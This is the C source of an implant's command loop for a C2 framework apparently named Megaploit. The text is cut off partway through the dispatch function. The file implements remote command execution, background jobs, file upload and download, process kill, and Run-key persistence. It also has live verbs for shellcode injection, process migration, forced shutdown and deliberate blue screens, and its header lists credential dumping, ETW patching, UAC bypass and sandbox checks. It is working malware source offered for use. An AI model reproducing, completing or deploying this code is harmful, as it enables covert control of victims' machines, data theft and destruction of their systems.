/*
 * client/shell.c  --  Shell command-loop for the Megaploit C2 protocol
 * ======================================================================
 * Receives encrypted commands from the C2, dispatches them through the
 * handler table below, and sends encrypted responses back.  Mirrors
 * megaploit/agent/handlers.py for shared verbs.
 *
 * Verb dispatch table
 * -------------------
 *  Each verb is matched with strncmp().  megaploit/core/c_probe.py scans
 *  these strncmp() calls at runtime to discover the full verb set without
 *  hardcoding any string in Python.
 *
 *  Native C handlers (Windows API â€” no child process):
 *    sysinfo           -- OS, hostname, username, arch, CWD
 *    os_info           -- extended OS info (build, install date, uptime)
 *    cd <path>         -- SetCurrentDirectoryA
 *    ls [path]         -- directory listing
 *    ps                -- running process list (PID, name, PPID, arch, user)
 *    kill <pid>        -- TerminateProcess
 *    env [filter]      -- GetEnvironmentStrings dump
 *    getclip           -- OpenClipboard / GetClipboardData
 *    setclip <text>    -- OpenClipboard / SetClipboardData
 *    idle_time         -- GetLastInputInfo
 *    lock_screen       -- LockWorkStation
 *    active_windows    -- EnumWindows
 *    msgbox <t> <m>    -- MessageBoxA (async thread)
 *    upload <name>     -- receive framed file, write to disk
 *    download <path>   -- send "FILE_OK" then the framed file bytes
 *    persist <k> <f>   -- copy EXE to %APPDATA%\<f>, set HKCU Run key
 *    self_destruct     -- remove registry key, schedule EXE deletion, exit
 *
 *  Shell-command fallbacks (cmd.exe / powershell):
 *    users / logged_in / services / scheduled_tasks / installed_software
 *    startup_items / wifi_passwords / hashdump / dns_query / netstat / arp
 *    ifconfig / routes / etw_patch / sandbox_check / cat / mkdir / rm
 *    find_files / file_hash / tail / write_file / chmod / find_writable
 *    find_suid
 *
 *  C-exclusive verbs:
 *    inject <pid> <hex>  -- shellcode injection (NT native API, W^X)
 *    migrate <pid>       -- agent migration (reflective PE load in target)
 *    forceOff()          -- NtSetSystemPowerState + NtShutdownSystem
 *    blueScreen()        -- NtRaiseHardError(STATUS_ASSERTION_FAILURE) BSOD
 *
 *  Not-supported stubs (Python-agent-only features):
 *    screenshot / screenrecord / screen_stream / webcam / record / mic_level
 *    keylog_* / browser_* / reverse_shell / socks5 / portfwd
 *    cred_vault / ssh_harvest / sudo_* / notify / play_sound
 *    forkbomb / living_off_land / zip_download / zip_upload
 *
 *  C-implemented (formerly stubs, now live):
 *    inject_shellcode / dll_inject / uac_bypass / getsystem / token_revert
 *    clip_watch / open_url / set_wallpaper / mouse_move / type_keys / run_psh
 *
 *  Shell fallback:
 *    <anything else>   -- CreateProcess+pipe fallback; covers remaining shell commands
 */

#include "shell.h"
#include "shell_internal.h"
#include "../core/ntcalls.h"
#include "../inject/inject.h"
#include "../evasion/evasion.h"
#include "../inject/loader.h"
#include "../inject/loader_blob.h"
#include "../evasion/syscall.h"

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

/* ══════════════════════════════════════════════════════════════════════════
 * Background job table
 * ══════════════════════════════════════════════════════════════════════════
 *
 * Design
 * ------
 * bg_shell_exec() spawns a Windows thread that runs cmd.exe via CreateProcess,
 * stdout, then stores the result in a slot.  The shell loop thread stays
 * free to receive the next command immediately.
 *
 * Concurrency
 * -----------
 * g_tls_cs  — guards every tls_send_msg() call from any thread so background
 *             threads can push "job done" notifications without racing the
 *             main loop's own sends.
 * g_job_cs  — guards the g_jobs[] table itself.
 *
 * Lifecycle
 * ---------
 *  bg <cmd>          → allocate slot, return job ID immediately, fire thread
 *  jobs              → list all slots (running / done / output size)
 *  job_output <id>   → retrieve accumulated output, free slot
 *  job_kill   <id>   → TerminateProcess on the cmd.exe handle, free slot
 *
 * Job slots are never implicitly freed; the operator must call job_output
 * or job_kill to reclaim them (or wait — all slots full → bg returns error).
 */

#define JOB_MAX        16          /* max concurrent background jobs           */
#define JOB_BUF_LIMIT  (4*1024*1024) /* 4 MB max accumulated output per job   */

typedef enum { JOB_FREE=0, JOB_RUNNING, JOB_DONE } _JobState;

typedef struct {
    volatile _JobState state;
    int                id;
    HANDLE             hThread;    /* background worker thread                 */
    HANDLE             hProcess;   /* cmd.exe process handle (for job_kill)    */
    char              *output;     /* heap-allocated accumulated stdout        */
    size_t             outLen;
    char               cmd[1024];  /* copy of the command string               */
    TLS_CONTEXT       *pTls;       /* shared TLS channel                       */
} _Job;

static _Job            g_jobs[JOB_MAX];
static CRITICAL_SECTION g_job_cs;
static CRITICAL_SECTION g_tls_cs;
static BOOL            g_cs_init = FALSE;

/* Initialise both critical sections (called once from shell_run) */
static void _jobs_init(void)
{
    if (g_cs_init) return;
    InitializeCriticalSection(&g_job_cs);
    InitializeCriticalSection(&g_tls_cs);
    memset(g_jobs, 0, sizeof(g_jobs));
    g_cs_init = TRUE;
}

/* Thread-safe send — wraps tls_send_msg so background threads can use it */
static void _safe_send(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    size_t len = strlen(msg);
    EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)len);
    LeaveCriticalSection(&g_tls_cs);
}

/* Background worker thread */
static DWORD WINAPI _job_worker(LPVOID param)
{
    _Job *job = (_Job *)param;

    /* Open a new cmd.exe process so we can get its handle for job_kill */
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        EnterCriticalSection(&g_job_cs);
        job->state = JOB_DONE;
        LeaveCriticalSection(&g_job_cs);
        return 1;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWritePipe;
    si.hStdError   = hWritePipe;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    /* Build the full command line: cmd /c <job->cmd> */
    char fullCmd[1200] = {0};
    _snprintf(fullCmd, sizeof(fullCmd) - 1, "cmd /c %s", job->cmd);

    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWritePipe);   /* parent's copy — must close before read loop */

    if (!ok) {
        CloseHandle(hReadPipe);
        EnterCriticalSection(&g_job_cs);
        job->state = JOB_DONE;
        LeaveCriticalSection(&g_job_cs);
        return 1;
    }

    /* Store the process handle so job_kill can terminate it */
    EnterCriticalSection(&g_job_cs);
    job->hProcess = pi.hProcess;
    LeaveCriticalSection(&g_job_cs);
    CloseHandle(pi.hThread);

    /* Read stdout/stderr until the child exits */
    size_t bufSize = SHELL_RESP_BUF;
    char  *buf     = (char *)malloc(bufSize);
    size_t used    = 0;
    if (buf) {
        char chunk[4096];
        DWORD nRead = 0;
        while (ReadFile(hReadPipe, chunk, sizeof(chunk), &nRead, NULL) && nRead > 0) {
            if (used + nRead + 1 >= bufSize && bufSize < JOB_BUF_LIMIT) {
                bufSize = (bufSize * 2 < JOB_BUF_LIMIT) ? bufSize * 2 : JOB_BUF_LIMIT;
                char *p = (char *)realloc(buf, bufSize);
                if (p) buf = p; else break;
            }
            if (used + nRead < bufSize) {
                memcpy(buf + used, chunk, nRead);
                used += nRead;
            }
        }
        buf[used] = '\0';
    }
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);

    /* Store result and mark done */
    EnterCriticalSection(&g_job_cs);
    job->output   = buf;
    job->outLen   = used;
    job->hProcess = NULL;
    job->state    = JOB_DONE;
    LeaveCriticalSection(&g_job_cs);

    /* Notify C2 that the job finished */
    char note[64];
    _snprintf(note, sizeof(note) - 1, "[*] job %d done (%zu bytes)", job->id, used);
    _safe_send(job->pTls, note);

    return 0;
}

/* ── bg_shell_exec ────────────────────────────────────────────────────────── */
/*
 * Dispatch a shell command as a background job.
 * Returns the job ID immediately so the shell loop stays responsive.
 */
static void _bg_shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    if (!cmd || !*cmd) { _send_str(pTls, "Usage: bg <command>"); return; }

    EnterCriticalSection(&g_job_cs);

    /* Find a free slot */
    _Job *slot = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state == JOB_FREE) { slot = &g_jobs[i]; break; }
    }

    if (!slot) {
        LeaveCriticalSection(&g_job_cs);
        _send_str(pTls, "[-] bg: all job slots occupied (use job_output or job_kill to free)");
        return;
    }

    /* Assign a simple 1-based sequential ID */
    static int g_next_id = 1;
    slot->id      = g_next_id++;
    slot->state   = JOB_RUNNING;
    slot->output  = NULL;
    slot->outLen  = 0;
    slot->hProcess= NULL;
    slot->pTls    = pTls;
    strncpy(slot->cmd, cmd, sizeof(slot->cmd) - 1);
    slot->cmd[sizeof(slot->cmd)-1] = '\0';

    LeaveCriticalSection(&g_job_cs);

    /* Spawn worker */
    slot->hThread = CreateThread(NULL, 0, _job_worker, slot, 0, NULL);
    if (!slot->hThread) {
        EnterCriticalSection(&g_job_cs);
        slot->state = JOB_FREE;
        LeaveCriticalSection(&g_job_cs);
        _send_str(pTls, "[-] bg: CreateThread failed");
        return;
    }
    CloseHandle(slot->hThread);
    slot->hThread = NULL;

    char buf[64];
    _snprintf(buf, sizeof(buf) - 1, "[+] bg: job %d started", slot->id);
    _send_str(pTls, buf);
}

/* ── jobs ─────────────────────────────────────────────────────────────────── */
static void _list_jobs(TLS_CONTEXT *pTls)
{
    EnterCriticalSection(&g_job_cs);

    size_t respSz = 512;
    char  *resp   = (char *)malloc(respSz);
    if (!resp) { LeaveCriticalSection(&g_job_cs); _send_str(pTls, "[-] jobs: OOM"); return; }

    int off = _snprintf(resp, respSz - 1, "  %-4s %-8s %s\n  %-4s %-8s %s\n",
                        "ID", "State", "Command",
                        "--", "-----", "-------");
    if (off < 0) off = 0;

    BOOL any = FALSE;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state == JOB_FREE) continue;
        any = TRUE;
        const char *st = (g_jobs[i].state == JOB_RUNNING) ? "RUNNING" : "DONE";
        char line[1100];
        int ll = _snprintf(line, sizeof(line) - 1,
                           "  %-4d %-8s %s  (%zu bytes)\n",
                           g_jobs[i].id, st, g_jobs[i].cmd, g_jobs[i].outLen);
        if (ll > 0) {
            if ((size_t)(off + ll + 1) >= respSz) {
                char *p = (char *)realloc(resp, respSz * 2);
                if (p) { respSz *= 2; resp = p; } else break;
            }
            memcpy(resp + off, line, ll);
            off += ll;
        }
    }

    LeaveCriticalSection(&g_job_cs);

    if (!any) { free(resp); _send_str(pTls, "(no background jobs)"); return; }
    resp[off] = '\0';
    tls_send_msg(pTls, (const BYTE *)resp, (DWORD)off);
    free(resp);
}

/* ── job_output ───────────────────────────────────────────────────────────── */
static void _job_output(TLS_CONTEXT *pTls, const char *args)
{
    int id = atoi(args);
    if (id <= 0) { _send_str(pTls, "Usage: job_output <id>"); return; }

    EnterCriticalSection(&g_job_cs);
    _Job *job = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state != JOB_FREE && g_jobs[i].id == id) { job = &g_jobs[i]; break; }
    }

    if (!job) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[-] job_output: job %d not found", id);
        _send_str(pTls, buf); return;
    }
    if (job->state == JOB_RUNNING) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[*] job %d still running", id);
        _send_str(pTls, buf); return;
    }

    /* Steal the output buffer and free the slot */
    char  *out   = job->output;
    size_t outLen= job->outLen;
    job->output  = NULL;
    job->outLen  = 0;
    job->state   = JOB_FREE;
    LeaveCriticalSection(&g_job_cs);

    if (out && outLen > 0)
        tls_send_msg(pTls, (const BYTE *)out, (DWORD)outLen);
    else
        _send_str(pTls, "(no output)");

    free(out);
}

/* ── job_kill ─────────────────────────────────────────────────────────────── */
static void _job_kill(TLS_CONTEXT *pTls, const char *args)
{
    int id = atoi(args);
    if (id <= 0) { _send_str(pTls, "Usage: job_kill <id>"); return; }

    EnterCriticalSection(&g_job_cs);
    _Job *job = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state != JOB_FREE && g_jobs[i].id == id) { job = &g_jobs[i]; break; }
    }

    if (!job) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[-] job_kill: job %d not found", id);
        _send_str(pTls, buf); return;
    }

    HANDLE hProc = job->hProcess;
    job->hProcess = NULL;
    if (job->output) { free(job->output); job->output = NULL; }
    job->state = JOB_FREE;
    LeaveCriticalSection(&g_job_cs);

    if (hProc) {
        TerminateProcess(hProc, 1);
        CloseHandle(hProc);
    }
    char buf[48]; _snprintf(buf, sizeof(buf)-1, "[+] job %d killed", id);
    _send_str(pTls, buf);
}

/*
 * _json_unwrap â€” strip the outer JSON string quotes that send_msg() adds.
 * "sysinfo" â†’ sysinfo   (in-place, returns new length)
 */
static DWORD _json_unwrap(char *pBuf, DWORD cbBuf)
{
    if (cbBuf < 2 || pBuf[0] != '"' || pBuf[cbBuf - 1] != '"')
        return cbBuf;
    DWORD src = 1, dst = 0, end = cbBuf - 1;
    while (src < end) {
        if (pBuf[src] == '\\' && src + 1 < end) {
            char next = pBuf[src + 1];
            if (next == '"' || next == '\\') { pBuf[dst++] = next; src += 2; continue; }
        }
        pBuf[dst++] = pBuf[src++];
    }
    pBuf[dst] = '\0';
    return dst;
}


/* â”€â”€ Public: shell_run â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

/* RVA → raw-file-offset helper used by stage_load's PE export scanner */
static DWORD _stage_rva2off(DWORD rva, const IMAGE_SECTION_HEADER *sec, WORD nSec)
{
    for (WORD i = 0; i < nSec; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva <  sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
    }
    return 0;
}

void shell_run(TLS_CONTEXT *pTls)
{
    inject_init();
    _jobs_init();   /* one-time CS init; idempotent */

    BYTE  *pCmd  = NULL;
    DWORD  cbCmd = 0;

    while (1) {
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
            break;

        /* Strip JSON string wrapper ("cmd" â†’ cmd) */
        cbCmd = _json_unwrap((char *)pCmd, cbCmd);
        const char *cmd = (const char *)pCmd;

        /* â”€â”€ exit / q â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }
        if (cbCmd == 1 && cmd[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* â”€â”€ sysinfo â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("sysinfo", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_sysinfo(pTls);
            continue;
        }

        /* â”€â”€ os_info â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("os_info", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_os_info(pTls);
            continue;
        }

        /* â”€â”€ cd <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 3 && strncmp("cd ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_cd(pTls, path);
            continue;
        }

        /* â”€â”€ ls [path] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if ((cbCmd == 2 && strncmp("ls", cmd, 2) == 0) ||
            (cbCmd >= 3 && strncmp("ls ", cmd, 3) == 0)) {
            char path[MAX_PATH] = {0};
            if (cbCmd > 3) strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_ls(pTls, path[0] ? path : NULL);
            continue;
        }

        /* â”€â”€ ps â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 2 && strncmp("ps", cmd, 2) == 0 &&
            (cbCmd == 2 || cmd[2] == ' ' || cmd[2] == '\r' || cmd[2] == '\n')) {
            free(pCmd); pCmd = NULL;
            _handle_ps(pTls);
            continue;
        }

        /* â”€â”€ kill <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 5 && strncmp("kill ", cmd, 5) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 5, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_kill(pTls, args);
            continue;
        }

        /* â”€â”€ env [filter] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if ((cbCmd == 3 && strncmp("env", cmd, 3) == 0) ||
            (cbCmd >= 4 && strncmp("env ", cmd, 4) == 0)) {
            char filter[256] = {0};
            if (cbCmd > 4) strncpy(filter, cmd + 4, sizeof(filter) - 1);
            free(pCmd); pCmd = NULL;
            _handle_env(pTls, filter[0] ? filter : NULL);
            continue;
        }

        /* â”€â”€ getclip â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("getclip", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_getclip(pTls);
            continue;
        }

        /* â”€â”€ setclip <text> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("setclip ", cmd, 8) == 0) {
            char text[4096] = {0};
            strncpy(text, cmd + 8, sizeof(text) - 1);
            free(pCmd); pCmd = NULL;
            _handle_setclip(pTls, text);
            continue;
        }

        /* â”€â”€ idle_time â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 9 && strncmp("idle_time", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_idle_time(pTls);
            continue;
        }

        /* â”€â”€ lock_screen â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 11 && strncmp("lock_screen", cmd, 11) == 0 &&
            (cbCmd == 11 || cmd[11] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_lock_screen(pTls);
            continue;
        }

        /* â”€â”€ active_windows â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 14 && strncmp("active_windows", cmd, 14) == 0 &&
            (cbCmd == 14 || cmd[14] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_active_windows(pTls);
            continue;
        }

        /* â”€â”€ msgbox <title> <message> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("msgbox ", cmd, 7) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 7, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_msgbox(pTls, args);
            continue;
        }

        /* â”€â”€ upload <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("upload ", cmd, 7) == 0) {
            char filename[MAX_PATH] = {0};
            strncpy(filename, cmd + 7, sizeof(filename) - 1);
            free(pCmd); pCmd = NULL;
            _handle_upload(pTls, filename);
            continue;
        }

        /* â”€â”€ download <path> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 9 && strncmp("download ", cmd, 9) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 9, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_download(pTls, path);
            continue;
        }

        /* â”€â”€ persist <regkey> <filename> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("persist ", cmd, 8) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_persist(pTls, args);
            continue;
        }

        /* â”€â”€ self_destruct â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 13 && strncmp("self_destruct", cmd, 13) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_self_destruct(pTls);
            return;
        }

        /* â”€â”€ inject <pid> <hex> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 7 && strncmp("inject ", cmd, 7) == 0) {
            char args[65600] = {0};
            strncpy(args, cmd + 7, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            inject_shellcode(pTls, args);
            continue;
        }

        /* â”€â”€ migrate <pid> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 8 && strncmp("migrate ", cmd, 8) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;
        }

        /* â”€â”€ forceOff() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 10 && strncmp("forceOff()", cmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns1 = NtSetSystemPowerState(PowerActionShutdownOff,
                                                  PowerSystemShutdown,
                                                  SHTDN_REASON_MAJOR_HARDWARE |
                                                  SHTDN_REASON_MINOR_POWER_SUPPLY);
            NTSTATUS ns2 = NtShutdownSystem(ShutdownPowerOff);
            if (!NT_SUCCESS(ns1) && !NT_SUCCESS(ns2)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] forceOff: access denied (0x%08lX / 0x%08lX) â€” "
                    "need SeShutdownPrivilege",
                    (unsigned long)ns1, (unsigned long)ns2);
                _send_str(pTls, buf);
                continue;
            }
            return;
        }

        /* â”€â”€ blueScreen() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 12 && strncmp("blueScreen()", cmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                                            6, &g_hardErrorResponse);
            if (!NT_SUCCESS(ns)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] blueScreen: NtRaiseHardError failed (0x%08lX) â€” "
                    "need SeDebugPrivilege or SYSTEM",
                    (unsigned long)ns);
                _send_str(pTls, buf);
            }
            continue;
        }

        /* â”€â”€ Shell-command fallbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        /* These verbs map 1-to-1 to Windows shell commands.           */

        /* users â†’ net user */
        if (cbCmd >= 5 && strncmp("users", cmd, 5) == 0 &&
            (cbCmd == 5 || cmd[5] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "net user");
            continue;
        }

        /* logged_in â†’ query user */
        if (cbCmd >= 9 && strncmp("logged_in", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "query user 2>&1");
            continue;
        }

        /* services [filter] â†’ sc query / tasklist /svc */
        if (cbCmd >= 8 && strncmp("services", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            char sub[MAX_PATH] = {0};
            char shellcmd[MAX_PATH + 32] = {0};
            if (cbCmd > 9) {
                strncpy(sub, cmd + 9, sizeof(sub) - 1);
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "sc query state= all | findstr /i \"%s\"", sub);
            } else {
                strncpy(shellcmd, "sc query state= all", sizeof(shellcmd) - 1);
            }
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* scheduled_tasks â†’ schtasks */
        if (cbCmd >= 15 && strncmp("scheduled_tasks", cmd, 15) == 0 &&
            (cbCmd == 15 || cmd[15] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "schtasks /query /fo LIST 2>&1");
            continue;
        }

        /* installed_software → reg query Uninstall hive
         * (wmic product was removed from Windows 11 24H2; use reg query directly) */
        if (cbCmd >= 18 && strncmp("installed_software", cmd, 18) == 0 &&
            (cbCmd == 18 || cmd[18] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
                " /s /v DisplayName 2>&1 & "
                "reg query \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
                " /s /v DisplayName 2>&1");
            continue;
